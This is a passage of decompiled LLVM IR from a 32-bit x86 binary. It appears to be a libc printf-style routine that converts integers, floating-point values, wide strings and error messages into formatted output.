dec_label_pc_804e415:                             ; preds = %dec_label_pc_804e3fc, %dec_label_pc_804e40b
  %v2_804e415 = add i32 %v1_804e415, -4
  %v3_804e415 = inttoptr i32 %v2_804e415 to i32*
  store i32 %v0_804e415.pre, i32* %v3_804e415, align 4
  %v0_804e416 = load i32, i32* @esi, align 4
  %v2_804e416 = add i32 %v1_804e415, -8
  %v3_804e416 = inttoptr i32 %v2_804e416 to i32*
  store i32 %v0_804e416, i32* %v3_804e416, align 4
  %v0_804e417 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e417 = add i32 %v1_804e415, -12
  %v3_804e417 = inttoptr i32 %v2_804e417 to i32*
  store i32 %v0_804e417, i32* %v3_804e417, align 4
  %v0_804e418 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e418 = add i32 %v1_804e415, -16
  %v3_804e418 = inttoptr i32 %v2_804e418 to i32*
  store i32 %v0_804e418, i32* %v3_804e418, align 4
  %v0_804e419 = call i32 @_load_inttype()
  %v0_804e41e = load i32, i32* @ebx, align 4
  %v1_804e41e = load i32, i32* @esp, align 4
  %v2_804e41e = inttoptr i32 %v1_804e41e to i32*
  store i32 %v0_804e41e, i32* %v2_804e41e, align 4
  %v0_804e421 = load i32, i32* @esi, align 4
  %v1_804e421 = load i32, i32* @esp, align 4
  %v2_804e421 = add i32 %v1_804e421, -4
  %v3_804e421 = inttoptr i32 %v2_804e421 to i32*
  store i32 %v0_804e421, i32* %v3_804e421, align 4
  %v0_804e422 = load i32, i32* @edx, align 4
  %v2_804e422 = add i32 %v1_804e421, -8
  %v3_804e422 = inttoptr i32 %v2_804e422 to i32*
  store i32 %v0_804e422, i32* %v3_804e422, align 4
  %v2_804e423 = add i32 %v1_804e421, -12
  %v3_804e423 = inttoptr i32 %v2_804e423 to i32*
  store i32 %v0_804e419, i32* %v3_804e423, align 4
  %v1_804e424 = add i32 %v1_804e421, 347
  store i32 %v1_804e424, i32* %eax.global-to-local, align 4
  %v2_804e42b = add i32 %v1_804e421, -16
  %v3_804e42b = inttoptr i32 %v2_804e42b to i32*
  store i32 %v1_804e424, i32* %v3_804e42b, align 4
  %v0_804e42c = load i32, i32* %stack_var_-364, align 4
  %v5_804e42c = inttoptr i32 %v0_804e42c to i8*
  %v6_804e42c = call i32 @_uintmaxtostr(i8* %v5_804e42c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e42c, i32* %eax.global-to-local, align 4
  %v0_804e431 = load i32, i32* @esp, align 4
  %v1_804e431 = add i32 %v0_804e431, 32
  store i32 %v6_804e42c, i32* @edi, align 4
  %v1_804e436 = add i32 %v0_804e431, 80
  %v2_804e436 = inttoptr i32 %v1_804e436 to i32*
  %v3_804e436 = load i32, i32* %v2_804e436, align 4
  %tmp95 = icmp ult i32 %v3_804e436, 6
  br i1 %tmp95, label %dec_label_pc_804e464, label %dec_label_pc_804e43d

dec_label_pc_804e43d:                             ; preds = %dec_label_pc_804e415
  %v1_804e43d = inttoptr i32 %v6_804e42c to i8*
  %v2_804e43d = load i8, i8* %v1_804e43d, align 1
  %v11_804e43d = icmp eq i8 %v2_804e43d, 45
  %v1_804e440 = icmp eq i1 %v11_804e43d, false
  %v1_804e44f = add i32 %v0_804e431, 64
  %v2_804e44f = inttoptr i32 %v1_804e44f to i32*
  %v3_804e44f = load i32, i32* %v2_804e44f, align 4
  br i1 %v1_804e440, label %dec_label_pc_804e44f, label %dec_label_pc_804e442

dec_label_pc_804e442:                             ; preds = %dec_label_pc_804e43d
  %v4_804e442 = or i32 %v3_804e44f, 2
  store i32 %v4_804e442, i32* %v2_804e44f, align 4
  %v0_804e447 = load i32, i32* @edi, align 4
  %v1_804e447 = add i32 %v0_804e447, 1
  store i32 %v1_804e447, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804e464.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e464

dec_label_pc_804e44f:                             ; preds = %dec_label_pc_804e43d
  store i32 %v3_804e44f, i32* %eax.global-to-local, align 4
  %v2_804e453 = and i32 %v3_804e44f, 2
  %v3_804e453 = icmp eq i32 %v2_804e453, 0
  br i1 %v3_804e453, label %dec_label_pc_804e45b, label %dec_label_pc_804e457

dec_label_pc_804e457:                             ; preds = %dec_label_pc_804e44f
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e464

dec_label_pc_804e45b:                             ; preds = %dec_label_pc_804e44f
  %v2_804e45b = urem i32 %v3_804e44f, 2
  %v3_804e45b = icmp eq i32 %v2_804e45b, 0
  br i1 %v3_804e45b, label %dec_label_pc_804e464, label %dec_label_pc_804e45f

dec_label_pc_804e45f:                             ; preds = %dec_label_pc_804e45b
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_804e464

dec_label_pc_804e464:                             ; preds = %dec_label_pc_804e45b, %dec_label_pc_804e415, %dec_label_pc_804e457, %dec_label_pc_804e442, %dec_label_pc_804e45f
  %v0_804e4b7 = phi i32 [ %v6_804e42c, %dec_label_pc_804e45b ], [ %v6_804e42c, %dec_label_pc_804e415 ], [ %v6_804e42c, %dec_label_pc_804e457 ], [ %v1_804e447, %dec_label_pc_804e442 ], [ %v6_804e42c, %dec_label_pc_804e45f ]
  %v0_804e4c6 = phi i32 [ %v1_804e431, %dec_label_pc_804e45b ], [ %v1_804e431, %dec_label_pc_804e415 ], [ %v1_804e431, %dec_label_pc_804e457 ], [ %v0_804e464.pre, %dec_label_pc_804e442 ], [ %v1_804e431, %dec_label_pc_804e45f ]
  %v1_804e464 = add i32 %v0_804e4c6, 204
  store i32 %v1_804e464, i32* %ecx.global-to-local, align 4
  %v1_804e46b = add i32 %v0_804e4c6, 20
  %v2_804e46b = inttoptr i32 %v1_804e46b to i32*
  %v3_804e46b = load i32, i32* %v2_804e46b, align 4
  store i32 %v3_804e46b, i32* %edx.global-to-local, align 4
  %v2_804e46f = sub i32 %v1_804e464, %v0_804e4b7
  store i32 %v2_804e46f, i32* %ecx.global-to-local, align 4
  %v2_804e471 = icmp slt i32 %v3_804e46b, 0
  %v1_804e473 = add i32 %v2_804e46f, 127
  store i32 %v1_804e473, i32* @esi, align 4
  %v1_804e476 = icmp eq i1 %v2_804e471, false
  br i1 %v1_804e476, label %dec_label_pc_804e47d, label %dec_label_pc_804e478

dec_label_pc_804e478:                             ; preds = %dec_label_pc_804e464
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e47d

dec_label_pc_804e47d:                             ; preds = %dec_label_pc_804e464, %dec_label_pc_804e478
  %v0_804e4a3 = phi i32 [ %v3_804e46b, %dec_label_pc_804e464 ], [ 1, %dec_label_pc_804e478 ]
  %v1_804e47d = add i32 %v0_804e4c6, 32
  %v2_804e47d = inttoptr i32 %v1_804e47d to i8*
  %v3_804e47d = load i8, i8* %v2_804e47d, align 1
  %v4_804e47d = and i8 %v3_804e47d, 16
  %v5_804e47d = icmp eq i8 %v4_804e47d, 0
  br i1 %v5_804e47d, label %dec_label_pc_804e4b7, label %dec_label_pc_804e484

dec_label_pc_804e484:                             ; preds = %dec_label_pc_804e47d
  %v1_804e484 = add i32 %v0_804e4c6, 48
  %v2_804e484 = inttoptr i32 %v1_804e484 to i32*
  %v3_804e484 = load i32, i32* %v2_804e484, align 4
  store i32 %v3_804e484, i32* %eax.global-to-local, align 4
  %tmp96 = icmp ult i32 %v3_804e484, 3
  br i1 %tmp96, label %dec_label_pc_804e49e.thread, label %dec_label_pc_804e492

dec_label_pc_804e49e.thread:                      ; preds = %dec_label_pc_804e484
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_804e4b7

dec_label_pc_804e492:                             ; preds = %dec_label_pc_804e484
  %v9_804e492 = icmp eq i32 %v3_804e484, 3
  %v1_804e495 = icmp eq i1 %v9_804e492, false
  br i1 %v1_804e495, label %dec_label_pc_804e49e, label %dec_label_pc_804e497

dec_label_pc_804e497:                             ; preds = %dec_label_pc_804e492
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804e4b7

dec_label_pc_804e49e:                             ; preds = %dec_label_pc_804e492
  %v9_804e49e = icmp eq i32 %v3_804e484, 4
  %v1_804e4a1 = icmp eq i1 %v9_804e49e, false
  br i1 %v1_804e4a1, label %dec_label_pc_804e4b7, label %dec_label_pc_804e4a3

dec_label_pc_804e4a3:                             ; preds = %dec_label_pc_804e49e
  %tmp97 = icmp ugt i32 %v0_804e4a3, %v1_804e473
  br i1 %tmp97, label %dec_label_pc_804e4b7, label %dec_label_pc_804e4a7

dec_label_pc_804e4a7:                             ; preds = %dec_label_pc_804e4a3
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804e4ac = inttoptr i32 %v0_804e4b7 to i8*
  %v2_804e4ac = load i8, i8* %v1_804e4ac, align 1
  %v8_804e4ac = icmp eq i8 %v2_804e4ac, 48
  br i1 %v8_804e4ac, label %dec_label_pc_804e4b7, label %dec_label_pc_804e4b1

dec_label_pc_804e4b1:                             ; preds = %dec_label_pc_804e4a7
  %v1_804e4b1 = add i32 %v2_804e46f, 128
  store i32 %v1_804e4b1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e4b7

dec_label_pc_804e4b7:                             ; preds = %dec_label_pc_804e49e.thread, %dec_label_pc_804e4a3, %dec_label_pc_804e4a7, %dec_label_pc_804e49e, %dec_label_pc_804e47d, %dec_label_pc_804e497, %dec_label_pc_804e4b1
  %v0_804e4ef = phi i32 [ %v0_804e4a3, %dec_label_pc_804e4a3 ], [ 1, %dec_label_pc_804e4a7 ], [ %v0_804e4a3, %dec_label_pc_804e49e ], [ %v0_804e4a3, %dec_label_pc_804e47d ], [ %v0_804e4a3, %dec_label_pc_804e497 ], [ %v1_804e4b1, %dec_label_pc_804e4b1 ], [ %v0_804e4a3, %dec_label_pc_804e49e.thread ]
  %v1_804e4b7 = inttoptr i32 %v0_804e4b7 to i8*
  %v2_804e4b7 = load i8, i8* %v1_804e4b7, align 1
  %v8_804e4b7 = icmp eq i8 %v2_804e4b7, 48
  %v1_804e4ba = icmp eq i1 %v8_804e4b7, false
  br i1 %v1_804e4ba, label %dec_label_pc_804e4e7, label %dec_label_pc_804e4bc

dec_label_pc_804e4bc:                             ; preds = %dec_label_pc_804e4b7
  %v0_804e4bc = load i32, i32* @ebp, align 4
  %v7_804e4bf = icmp sgt i32 %v0_804e4bc, 5
  br i1 %v7_804e4bf, label %dec_label_pc_804e4c1, label %dec_label_pc_804e4c6

dec_label_pc_804e4c1:                             ; preds = %dec_label_pc_804e4bc
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804e4c6

dec_label_pc_804e4c6:                             ; preds = %dec_label_pc_804e4bc, %dec_label_pc_804e4c1
  %v1_804e4c6 = add i32 %v0_804e4c6, 48
  %v2_804e4c6 = inttoptr i32 %v1_804e4c6 to i32*
  %v3_804e4c6 = load i32, i32* %v2_804e4c6, align 4
  %v12_804e4c6 = icmp eq i32 %v3_804e4c6, 1
  %v1_804e4cb = icmp eq i1 %v12_804e4c6, false
  br i1 %v1_804e4cb, label %dec_label_pc_804e4dc, label %dec_label_pc_804e4cd

dec_label_pc_804e4cd:                             ; preds = %dec_label_pc_804e4c6
  store i32 ptrtoint ([6 x i8]* @global_var_8056db8.202 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_804e658

dec_label_pc_804e4dc:                             ; preds = %dec_label_pc_804e4c6
  %v1_804e4dc = icmp eq i32 %v0_804e4ef, 0
  %v1_804e4de = icmp eq i1 %v1_804e4dc, false
  br i1 %v1_804e4de, label %dec_label_pc_804e4e7, label %dec_label_pc_804e4e0

dec_label_pc_804e4e0:                             ; preds = %dec_label_pc_804e4dc
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e658

dec_label_pc_804e4e7:                             ; preds = %dec_label_pc_804e4dc, %dec_label_pc_804e4b7
  %v2_804e4e7 = sub i32 %v0_804e4ef, %v1_804e473
  %v7_804e4e7 = icmp ult i32 %v0_804e4ef, %v1_804e473
  %v12_804e4e7 = icmp eq i32 %v2_804e4e7, 0
  %v2_804e4e9 = or i1 %v7_804e4e7, %v12_804e4e7
  br i1 %v2_804e4e9, label %dec_label_pc_804e658, label %dec_label_pc_804e4ef

dec_label_pc_804e4ef:                             ; preds = %dec_label_pc_804e4e7
  store i32 %v2_804e4e7, i32* @ebx, align 4
  br label %dec_label_pc_804e672

dec_label_pc_804e4f8:                             ; preds = %dec_label_pc_804e38e
  %tmp98 = icmp ult i32 %v3_804e360, 16
  br i1 %tmp98, label %dec_label_pc_804e4fd, label %dec_label_pc_804e542

dec_label_pc_804e4fd:                             ; preds = %dec_label_pc_804e4f8
  %v1_804e4fd = add i32 %v0_804e360.lcssa, 33
  %v2_804e4fd = inttoptr i32 %v1_804e4fd to i8*
  %v3_804e4fd = load i8, i8* %v2_804e4fd, align 1
  %v4_804e4fd = and i8 %v3_804e4fd, 8
  %v5_804e4fd = icmp eq i8 %v4_804e4fd, 0
  %v1_804e502 = add i32 %v0_804e360.lcssa, 344
  %v2_804e502 = inttoptr i32 %v1_804e502 to i32*
  %v3_804e502 = load i32, i32* %v2_804e502, align 4
  store i32 %v3_804e502, i32* %edx.global-to-local, align 4
  br i1 %v5_804e4fd, label %dec_label_pc_804e50f, label %dec_label_pc_804e50b

dec_label_pc_804e50b:                             ; preds = %dec_label_pc_804e4fd
  %v1_804e50b = inttoptr i32 %v3_804e502 to x86_fp80*
  %v2_804e50b = load x86_fp80, x86_fp80* %v1_804e50b, align 4
  br label %dec_label_pc_804e511

dec_label_pc_804e50f:                             ; preds = %dec_label_pc_804e4fd
  %v1_804e50f = inttoptr i32 %v3_804e502 to double*
  %v2_804e50f = load double, double* %v1_804e50f, align 4
  %v3_804e50f = fpext double %v2_804e50f to x86_fp80
  br label %dec_label_pc_804e511

dec_label_pc_804e511:                             ; preds = %dec_label_pc_804e50b, %dec_label_pc_804e50f
  %storemerge4 = phi x86_fp80 [ %v2_804e50b, %dec_label_pc_804e50b ], [ %v3_804e50f, %dec_label_pc_804e50f ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_804e511 = load i32, i32* @esi, align 4
  %v2_804e511 = add i32 %v0_804e360.lcssa, -4
  %v3_804e511 = inttoptr i32 %v2_804e511 to i32*
  store i32 %v0_804e511, i32* %v3_804e511, align 4
  %v0_804e512 = load i32, i32* @esi, align 4
  %v2_804e512 = add i32 %v0_804e360.lcssa, -8
  %v3_804e512 = inttoptr i32 %v2_804e512 to i32*
  store i32 %v0_804e512, i32* %v3_804e512, align 4
  %v1_804e513 = add i32 %v0_804e360.lcssa, -12
  %v2_804e513 = inttoptr i32 %v1_804e513 to i32*
  store i32 134537686, i32* %v2_804e513, align 4
  %v1_804e518 = add i32 %v0_804e360.lcssa, 20
  store i32 %v1_804e518, i32* %eax.global-to-local, align 4
  %v2_804e51c = add i32 %v0_804e360.lcssa, -16
  %v3_804e51c = inttoptr i32 %v2_804e51c to i32*
  store i32 %v1_804e518, i32* %v3_804e51c, align 4
  %v1_804e51d = add i32 %v0_804e360.lcssa, -28
  %v1_804e520 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804e520 = inttoptr i32 %v1_804e51d to x86_fp80*
  store x86_fp80 %v1_804e520, x86_fp80* %v3_804e520, align 4
  %v1_804e523 = add i32 %v0_804e360.lcssa, 368
  %v2_804e523 = inttoptr i32 %v1_804e523 to i32*
  %v3_804e523 = load i32, i32* %v2_804e523, align 4
  %v5_804e523 = add i32 %v0_804e360.lcssa, -32
  %v6_804e523 = inttoptr i32 %v5_804e523 to i32*
  store i32 %v3_804e523, i32* %v6_804e523, align 4
  %v0_804e52a = call i32 @_fpmaxtostr()
  store i32 %v0_804e52a, i32* %eax.global-to-local, align 4
  %v0_804e52f = load i32, i32* @esp, align 4
  %v1_804e52f = add i32 %v0_804e52f, 32
  %v2_804e532 = icmp slt i32 %v0_804e52a, 0
  br i1 %v2_804e532, label %dec_label_pc_804e7d3, label %dec_label_pc_804e53a

dec_label_pc_804e53a:                             ; preds = %dec_label_pc_804e511
  %v1_804e53a = inttoptr i32 %v1_804e52f to i32*
  %v2_804e53a = load i32, i32* %v1_804e53a, align 4
  %v4_804e53a = add i32 %v2_804e53a, %v0_804e52a
  store i32 %v4_804e53a, i32* %v1_804e53a, align 4
  %v0_804e7c0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e7c0

dec_label_pc_804e542:                             ; preds = %dec_label_pc_804e4f8
  %tmp99 = or i32 %v3_804e360, 1
  %tmp100 = icmp eq i32 %tmp99, 17
  br i1 %tmp100, label %dec_label_pc_804e54b, label %dec_label_pc_804e5de

dec_label_pc_804e54b:                             ; preds = %dec_label_pc_804e542
  %v9_804e542 = icmp eq i32 %v3_804e360, 17
  %v1_804e54b = add i32 %v0_804e360.lcssa, 332
  %v2_804e54b = inttoptr i32 %v1_804e54b to i32*
  store i32 0, i32* %v2_804e54b, align 4
  %v0_804e556 = load i32, i32* @esp, align 4
  %v1_804e556 = add i32 %v0_804e556, 344
  %v2_804e556 = inttoptr i32 %v1_804e556 to i32*
  %v3_804e556 = load i32, i32* %v2_804e556, align 4
  store i32 %v3_804e556, i32* %edx.global-to-local, align 4
  %v1_804e55d = icmp eq i1 %v9_804e542, false
  br i1 %v1_804e55d, label %dec_label_pc_804e5a9, label %dec_label_pc_804e55f

dec_label_pc_804e55f:                             ; preds = %dec_label_pc_804e54b
  %v1_804e55f = inttoptr i32 %v3_804e556 to i32*
  %v2_804e55f = load i32, i32* %v1_804e55f, align 4
  store i32 %v2_804e55f, i32* %eax.global-to-local, align 4
  %v2_804e561 = add i32 %v0_804e556, 340
  %v3_804e561 = inttoptr i32 %v2_804e561 to i32*
  store i32 %v2_804e55f, i32* %v3_804e561, align 4
  %v0_804e568 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e568 = icmp eq i32 %v0_804e568, 0
  br i1 %v1_804e568, label %dec_label_pc_804e65c, label %dec_label_pc_804e570

dec_label_pc_804e570:                             ; preds = %dec_label_pc_804e55f
  %v0_804e570 = load i32, i32* @esp, align 4
  %v1_804e570 = add i32 %v0_804e570, 20
  %v2_804e570 = inttoptr i32 %v1_804e570 to i32*
  %v3_804e570 = load i32, i32* %v2_804e570, align 4
  store i32 %v3_804e570, i32* %eax.global-to-local, align 4
  %v2_804e577 = icmp slt i32 %v3_804e570, 0
  br i1 %v2_804e577, label %dec_label_pc_804e57d, label %dec_label_pc_804e57b

dec_label_pc_804e57b:                             ; preds = %dec_label_pc_804e570
  br label %dec_label_pc_804e57d

dec_label_pc_804e57d:                             ; preds = %dec_label_pc_804e570, %dec_label_pc_804e57b
  %storemerge104 = phi i32 [ %v3_804e570, %dec_label_pc_804e57b ], [ -1, %dec_label_pc_804e570 ]
  store i32 %storemerge104, i32* %ecx.global-to-local, align 4
  %v1_804e57d = add i32 %v0_804e570, 340
  store i32 %v1_804e57d, i32* %edx.global-to-local, align 4
  %v1_804e584 = add i32 %v0_804e570, 332
  store i32 %v1_804e584, i32* %eax.global-to-local, align 4
  %v2_804e58b = add i32 %v0_804e570, -4
  %v3_804e58b = inttoptr i32 %v2_804e58b to i32*
  store i32 %v1_804e584, i32* %v3_804e58b, align 4
  %v0_804e58c = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e58c = add i32 %v0_804e570, -8
  %v3_804e58c = inttoptr i32 %v2_804e58c to i32*
  store i32 %v0_804e58c, i32* %v3_804e58c, align 4
  %v0_804e58d = load i32, i32* %edx.global-to-local, align 4
  %v2_804e58d = add i32 %v0_804e570, -12
  %v3_804e58d = inttoptr i32 %v2_804e58d to i32*
  store i32 %v0_804e58d, i32* %v3_804e58d, align 4
  %v0_804e58e = load i32, i32* %edx.global-to-local, align 4
  %v2_804e58e = add i32 %v0_804e570, -16
  %v3_804e58e = inttoptr i32 %v2_804e58e to i32*
  store i32 %v0_804e58e, i32* %v3_804e58e, align 4
  %v0_804e58f = call i32 @__GI_wcsrtombs()
  store i32 %v0_804e58f, i32* %eax.global-to-local, align 4
  %v0_804e594 = load i32, i32* @esp, align 4
  %v1_804e594 = add i32 %v0_804e594, 16
  store i32 %v0_804e58f, i32* @esi, align 4
  %v10_804e599 = icmp eq i32 %v0_804e58f, -1
  br i1 %v10_804e599, label %dec_label_pc_804e7d3, label %dec_label_pc_804e5a2

dec_label_pc_804e5a2:                             ; preds = %dec_label_pc_804e57d
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804e666

dec_label_pc_804e5a9:                             ; preds = %dec_label_pc_804e54b
  %v0_804e5a9 = load i32, i32* @ebx, align 4
  %v2_804e5a9 = add i32 %v0_804e556, -4
  %v3_804e5a9 = inttoptr i32 %v2_804e5a9 to i32*
  store i32 %v0_804e5a9, i32* %v3_804e5a9, align 4
  %v1_804e5aa = add i32 %v0_804e556, 332
  store i32 %v1_804e5aa, i32* %eax.global-to-local, align 4
  %v2_804e5b1 = add i32 %v0_804e556, -8
  %v3_804e5b1 = inttoptr i32 %v2_804e5b1 to i32*
  store i32 %v1_804e5aa, i32* %v3_804e5b1, align 4
  %v0_804e5b2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e5b2 = inttoptr i32 %v0_804e5b2 to i32*
  %v2_804e5b2 = load i32, i32* %v1_804e5b2, align 4
  %v4_804e5b2 = add i32 %v0_804e556, -12
  %v5_804e5b2 = inttoptr i32 %v4_804e5b2 to i32*
  store i32 %v2_804e5b2, i32* %v5_804e5b2, align 4
  %v1_804e5b4 = add i32 %v0_804e556, 204
  store i32 %v1_804e5b4, i32* @ebx, align 4
  %v2_804e5bb = add i32 %v0_804e556, -16
  %v3_804e5bb = inttoptr i32 %v2_804e5bb to i32*
  store i32 %v1_804e5b4, i32* %v3_804e5bb, align 4
  %v0_804e5bc = call i32 @__GI_wcrtomb()
  store i32 %v0_804e5bc, i32* %eax.global-to-local, align 4
  %v0_804e5c1 = load i32, i32* @esp, align 4
  %v1_804e5c1 = add i32 %v0_804e5c1, 16
  store i32 %v0_804e5bc, i32* @esi, align 4
  %v10_804e5c6 = icmp eq i32 %v0_804e5bc, -1
  br i1 %v10_804e5c6, label %dec_label_pc_804e7d3, label %dec_label_pc_804e5cf

dec_label_pc_804e5cf:                             ; preds = %dec_label_pc_804e5a9
  %v0_804e5cf = load i32, i32* @ebx, align 4
  store i32 %v0_804e5cf, i32* @edi, align 4
  %v2_804e5d1 = add i32 %v0_804e5bc, 220
  %v3_804e5d1 = add i32 %v2_804e5d1, %v0_804e5c1
  %v4_804e5d1 = inttoptr i32 %v3_804e5d1 to i8*
  store i8 0, i8* %v4_804e5d1, align 1
  br label %dec_label_pc_804e666

dec_label_pc_804e5de:                             ; preds = %dec_label_pc_804e542
  %tmp101 = icmp ult i32 %v3_804e360, 20
  br i1 %tmp101, label %dec_label_pc_804e5e3, label %dec_label_pc_804e62e

dec_label_pc_804e5e3:                             ; preds = %dec_label_pc_804e5de
  %v9_804e5de = icmp eq i32 %v3_804e360, 19
  %v1_804e5e3 = add i32 %v0_804e360.lcssa, 344
  %v2_804e5e3 = inttoptr i32 %v1_804e5e3 to i32*
  %v3_804e5e3 = load i32, i32* %v2_804e5e3, align 4
  store i32 %v3_804e5e3, i32* %edx.global-to-local, align 4
  %v1_804e5ea = icmp eq i1 %v9_804e5de, false
  %v1_804e60f = inttoptr i32 %v3_804e5e3 to i32*
  %v2_804e60f = load i32, i32* %v1_804e60f, align 4
  br i1 %v1_804e5ea, label %dec_label_pc_804e60f, label %dec_label_pc_804e5ec

dec_label_pc_804e5ec:                             ; preds = %dec_label_pc_804e5e3
  store i32 %v2_804e60f, i32* @edi, align 4
  %v1_804e5ee = icmp eq i32 %v2_804e60f, 0
  br i1 %v1_804e5ee, label %dec_label_pc_804e65c, label %dec_label_pc_804e5f2

dec_label_pc_804e5f2:                             ; preds = %dec_label_pc_804e5ec, %dec_label_pc_804e637
  %v1_804e5ff = phi i32 [ %v0_804e360.lcssa, %dec_label_pc_804e5ec ], [ %v1_804e651, %dec_label_pc_804e637 ]
  %v1_804e5f2 = add i32 %v1_804e5ff, 20
  %v2_804e5f2 = inttoptr i32 %v1_804e5f2 to i32*
  %v3_804e5f2 = load i32, i32* %v2_804e5f2, align 4
  store i32 %v3_804e5f2, i32* %eax.global-to-local, align 4
  %v2_804e5f9 = icmp slt i32 %v3_804e5f2, 0
  br i1 %v2_804e5f9, label %dec_label_pc_804e5ff, label %dec_label_pc_804e5fd

dec_label_pc_804e5fd:                             ; preds = %dec_label_pc_804e5f2
  br label %dec_label_pc_804e5ff

dec_label_pc_804e5ff:                             ; preds = %dec_label_pc_804e5f2, %dec_label_pc_804e5fd
  %storemerge = phi i32 [ %v3_804e5f2, %dec_label_pc_804e5fd ], [ -1, %dec_label_pc_804e5f2 ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_804e5ff = add i32 %v1_804e5ff, -4
  %v3_804e5ff = inttoptr i32 %v2_804e5ff to i32*
  store i32 %v3_804e360, i32* %v3_804e5ff, align 4
  %v2_804e600 = add i32 %v1_804e5ff, -8
  %v3_804e600 = inttoptr i32 %v2_804e600 to i32*
  store i32 %v3_804e360, i32* %v3_804e600, align 4
  %v0_804e601 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e601 = add i32 %v1_804e5ff, -12
  %v3_804e601 = inttoptr i32 %v2_804e601 to i32*
  store i32 %v0_804e601, i32* %v3_804e601, align 4
  %v0_804e602 = load i32, i32* @edi, align 4
  %v2_804e602 = add i32 %v1_804e5ff, -16
  %v3_804e602 = inttoptr i32 %v2_804e602 to i32*
  store i32 %v0_804e602, i32* %v3_804e602, align 4
  %v0_804e603 = call i32 @strnlen()
  store i32 %v0_804e603, i32* %eax.global-to-local, align 4
  store i32 %v0_804e603, i32* @esi, align 4
  br label %dec_label_pc_804e666

dec_label_pc_804e60f:                             ; preds = %dec_label_pc_804e5e3
  store i32 %v2_804e60f, i32* %eax.global-to-local, align 4
  %v1_804e611 = add i32 %v0_804e360.lcssa, 204
  store i32 %v1_804e611, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_804e61d = trunc i32 %v2_804e60f to i8
  %v4_804e61d = inttoptr i32 %v1_804e611 to i8*
  store i8 %v1_804e61d, i8* %v4_804e61d, align 1
  %v0_804e624 = load i32, i32* @esp, align 4
  %v1_804e624 = add i32 %v0_804e624, 205
  %v2_804e624 = inttoptr i32 %v1_804e624 to i8*
  store i8 0, i8* %v2_804e624, align 1
  br label %dec_label_pc_804e666

dec_label_pc_804e62e:                             ; preds = %dec_label_pc_804e5de
  %v9_804e62e = icmp eq i32 %v3_804e360, 20
  %v1_804e631 = icmp eq i1 %v9_804e62e, false
  br i1 %v1_804e631, label %dec_label_pc_804e7d3, label %dec_label_pc_804e637

dec_label_pc_804e637:                             ; preds = %dec_label_pc_804e62e
  %v0_804e637 = load i32, i32* %stack_var_-364, align 4
  %v1_804e637 = call i32 @__errno_location(i32 %v0_804e637)
  store i32 %v1_804e637, i32* %eax.global-to-local, align 4
  %v0_804e63c = load i32, i32* %edx.global-to-local, align 4
  %v1_804e63c = load i32, i32* @esp, align 4
  %v2_804e63c = add i32 %v1_804e63c, -4
  %v3_804e63c = inttoptr i32 %v2_804e63c to i32*
  store i32 %v0_804e63c, i32* %v3_804e63c, align 4
  %v1_804e63d = add i32 %v1_804e63c, -8
  %v2_804e63d = inttoptr i32 %v1_804e63d to i32*
  store i32 128, i32* %v2_804e63d, align 4
  %v1_804e642 = add i32 %v1_804e63c, 204
  store i32 %v1_804e642, i32* %edx.global-to-local, align 4
  %v2_804e649 = add i32 %v1_804e63c, -12
  %v3_804e649 = inttoptr i32 %v2_804e649 to i32*
  store i32 %v1_804e642, i32* %v3_804e649, align 4
  %v1_804e64a = inttoptr i32 %v1_804e637 to i32*
  %v2_804e64a = load i32, i32* %v1_804e64a, align 4
  %v4_804e64a = add i32 %v1_804e63c, -16
  %v5_804e64a = inttoptr i32 %v4_804e64a to i32*
  store i32 %v2_804e64a, i32* %v5_804e64a, align 4
  %v0_804e64c = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804e64c, i32* %eax.global-to-local, align 4
  %v0_804e651 = load i32, i32* @esp, align 4
  %v1_804e651 = add i32 %v0_804e651, 16
  store i32 %v0_804e64c, i32* @edi, align 4
  br label %dec_label_pc_804e5f2

dec_label_pc_804e658:                             ; preds = %dec_label_pc_804e4e7, %dec_label_pc_804e4e0, %dec_label_pc_804e4cd
  %v0_804e67236 = phi i32 [ %v1_804e473, %dec_label_pc_804e4e7 ], [ 0, %dec_label_pc_804e4e0 ], [ 5, %dec_label_pc_804e4cd ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e672

dec_label_pc_804e65c:                             ; preds = %dec_label_pc_804e5ec, %dec_label_pc_804e55f
  store i32 ptrtoint ([7 x i8]* @global_var_8056dbe.203 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_804e666

dec_label_pc_804e666:                             ; preds = %dec_label_pc_804e60f, %dec_label_pc_804e5ff, %dec_label_pc_804e5cf, %dec_label_pc_804e5a2, %dec_label_pc_804e65c
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_804e66d = load i32, i32* @esp, align 4
  %v1_804e66d = add i32 %v0_804e66d, 7
  %v2_804e66d = inttoptr i32 %v1_804e66d to i8*
  store i8 32, i8* %v2_804e66d, align 1
  %v0_804e672.pre = load i32, i32* @esi, align 4
  %v1_804e672.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e672

